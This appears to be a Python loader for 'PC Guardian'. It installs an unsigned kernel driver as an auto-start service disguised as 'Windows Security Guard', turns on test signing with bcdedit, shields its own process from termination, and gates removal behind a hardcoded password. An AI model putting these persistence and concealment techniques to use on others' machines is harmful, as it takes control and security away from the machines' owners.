"""
PC Guardian — Driver Loader
Loads PCGuard.sys kernel driver and communicates via IOCTL.
Must run as Administrator.
"""

import os
import sys
import ctypes
import ctypes.wintypes as wt
import subprocess
import logging
import struct

logger = logging.getLogger("driver_loader")

DRIVER_NAME    = "PCGuard"
DRIVER_FILE    = "PCGuard.sys"
DEVICE_PATH    = r"\\.\PCGuard"
PASSWORD       = "DECDRV"

# IOCTL codes — must match driver header
IOCTL_SET_PID = 0x80002000
IOCTL_UNLOAD  = 0x80002004

k32   = ctypes.windll.kernel32
adv32 = ctypes.windll.advapi32


def _get_driver_path() -> str:
    """Find PCGuard.sys next to this script or in system32."""
    local = os.path.join(os.path.dirname(os.path.abspath(__file__)), DRIVER_FILE)
    if os.path.exists(local):
        return local
    sys32 = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32", "drivers", DRIVER_FILE)
    return sys32


def _copy_to_drivers(src: str) -> str:
    """Copy .sys to System32\drivers\ where SCM expects it."""
    dst = os.path.join(
        os.environ.get("SystemRoot", r"C:\Windows"),
        "System32", "drivers", DRIVER_FILE
    )
    if os.path.abspath(src).lower() != dst.lower():
        import shutil
        shutil.copy2(src, dst)
        logger.info(f"Driver copied to {dst}")
    return dst


def _service_exists() -> bool:
    result = subprocess.run(
        f'sc query "{DRIVER_NAME}"',
        shell=True, capture_output=True, text=True
    )
    return result.returncode == 0


def install_driver() -> bool:
    """
    Register driver with Service Control Manager and start it.
    Requires Admin.
    """
    src = _get_driver_path()
    if not os.path.exists(src):
        logger.error(f"Driver file not found: {src}")
        return False

    dst = _copy_to_drivers(src)

    # Create service if not exists
    if not _service_exists():
        result = subprocess.run(
            f'sc create "{DRIVER_NAME}" '
            f'binPath= "{dst}" '
            f'type= kernel '
            f'start= auto '
            f'error= normal '
            f'DisplayName= "Windows Security Guard"',
            shell=True, capture_output=True, text=True
        )
        if result.returncode != 0:
            logger.error(f"sc create failed: {result.stderr}")
            return False

    # Start service
    result = subprocess.run(
        f'sc start "{DRIVER_NAME}"',
        shell=True, capture_output=True, text=True
    )
    if result.returncode not in (0, 1056):  # 1056 = already running
        logger.error(f"sc start failed: {result.stderr}")
        return False

    logger.info("PCGuard driver started.")
    return True


def uninstall_driver(password: str = PASSWORD) -> bool:
    """Stop and remove driver. Requires password."""
    if password.upper() != PASSWORD.upper():
        logger.error("Wrong password — driver uninstall denied.")
        return False

    # Send IOCTL_UNLOAD to driver first
    _send_unload_ioctl(password)

    subprocess.run(f'sc stop "{DRIVER_NAME}"',   shell=True, capture_output=True)
    subprocess.run(f'sc delete "{DRIVER_NAME}"', shell=True, capture_output=True)

    # Remove from System32\drivers
    dst = os.path.join(
        os.environ.get("SystemRoot", r"C:\Windows"),
        "System32", "drivers", DRIVER_FILE
    )
    try:
        if os.path.exists(dst):
            os.remove(dst)
    except Exception as e:
        logger.warning(f"Driver file remove: {e}")

    logger.info("Driver uninstalled.")
    return True


def _open_device():
    """Open handle to \\.\PCGuard device."""
    h = k32.CreateFileW(
        DEVICE_PATH,
        0xC0000000,   # GENERIC_READ | GENERIC_WRITE
        0, None,
        3,            # OPEN_EXISTING
        0, None
    )
    if h == wt.HANDLE(-1).value:
        err = k32.GetLastError()
        logger.error(f"CreateFile failed: {err}")
        return None
    return h


def set_protected_pid(pid: int) -> bool:
    """Tell driver which PID to protect."""
    h = _open_device()
    if not h:
        return False

    buf     = struct.pack("<I", pid)
    buf_c   = (ctypes.c_char * len(buf))(*buf)
    bytesRet = ctypes.c_ulong(0)

    ok = k32.DeviceIoControl(
        h,
        IOCTL_SET_PID,
        buf_c, len(buf),
        None, 0,
        ctypes.byref(bytesRet),
        None
    )

    k32.CloseHandle(h)

    if ok:
        logger.info(f"Driver protecting PID {pid}")
        return True
    else:
        logger.error(f"IOCTL_SET_PID failed: {k32.GetLastError()}")
        return False


def _send_unload_ioctl(password: str):
    h = _open_device()
    if not h:
        return

    pw_bytes  = (password + "\x00").encode("utf-16-le")
    pw_buf    = (ctypes.c_char * len(pw_bytes))(*pw_bytes)
    bytesRet  = ctypes.c_ulong(0)

    k32.DeviceIoControl(
        h, IOCTL_UNLOAD,
        pw_buf, len(pw_bytes),
        None, 0,
        ctypes.byref(bytesRet),
        None
    )
    k32.CloseHandle(h)


def enable_test_signing():
    """Enable test signing mode so unsigned driver loads."""
    result = subprocess.run(
        "bcdedit /set testsigning on",
        shell=True, capture_output=True, text=True
    )
    if result.returncode == 0:
        logger.info("Test signing enabled. Reboot required.")
        return True
    logger.error(f"Test signing failed: {result.stderr}")
    return False


def is_driver_loaded() -> bool:
    """Check if PCGuard driver is running."""
    result = subprocess.run(
        f'sc query "{DRIVER_NAME}"',
        shell=True, capture_output=True, text=True
    )
    return "RUNNING" in result.stdout


def init_driver() -> bool:
    """
    Full driver initialization:
    1. Enable test signing (if not already)
    2. Install and start driver
    3. Send our PID to protect
    """
    if is_driver_loaded():
        logger.info("Driver already loaded.")
        pid = os.getpid()
        return set_protected_pid(pid)

    if not install_driver():
        logger.error("Driver install failed.")
        return False

    import time
    time.sleep(1)  # Wait for driver to initialize

    pid = os.getpid()
    return set_protected_pid(pid)
